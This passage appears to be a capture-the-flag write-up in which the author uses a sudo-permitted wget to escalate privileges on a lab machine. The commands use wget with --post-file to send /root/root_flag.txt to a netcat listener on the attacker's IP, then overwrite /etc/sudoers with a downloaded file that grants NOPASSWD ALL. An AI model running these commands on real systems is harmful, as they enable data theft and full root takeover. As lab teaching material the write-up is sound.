GTFO method was not working so i use this other method and added here

First we start a listener on port 8000, which we can do by running the following:

> ```  
> ┌[parrot]─[02:14–02/07]─[/home/glack/Downloads]  
> └╼glack$nc -lnvp 8000
> 
> ```

And we post the contents of root flag using

> ```  
> sudo /usr/bin/wget — post-file=/root/root_flag.txt 10.17.24.189:8000
> 
> ```

and we get it easily

![](https://miro.medium.com/v2/resize:fit:458/1*SA-Ch7ZAju58Jz-d64J81A.png)


We create a file with the content named “sudoers”

> ```
> 
> #jessie ALL=(root) NOPASSWD: /usr/bin/wget  
> jessie ALL=(ALL) NOPASSWD: ALL
> 
> ```

Turn our machine into a web server using

> ```  
> ┌[parrot]─[02:22–02/07]─[/home/glack/Desktop/THM/wgel]  
> └╼glack$sudo python3 -m http.server  
> ```

We move to the /etc directory and download our file there, now this replaces the existing “sudoers” file with the one we downloaded.

We use the below commands

> ```
> 
> jessie@CorpOne:~/Documents$ cd /etc
> 
> jessie@CorpOne:/etc$ sudo /usr/bin/wget 10.17.24.189:8000/sudoers — output-document=sudoers  
> ```

And we can confirm this by using

> ```  
> jessie@CorpOne:/etc$ sudo -l  
> User jessie may run the following commands on CorpOne:  
> (ALL) NOPASSWD: ALL  
> ```

And we easily get the root shell

![](https://miro.medium.com/v2/resize:fit:425/1*48cm29TMamXhCB5Jwd4kpw.png)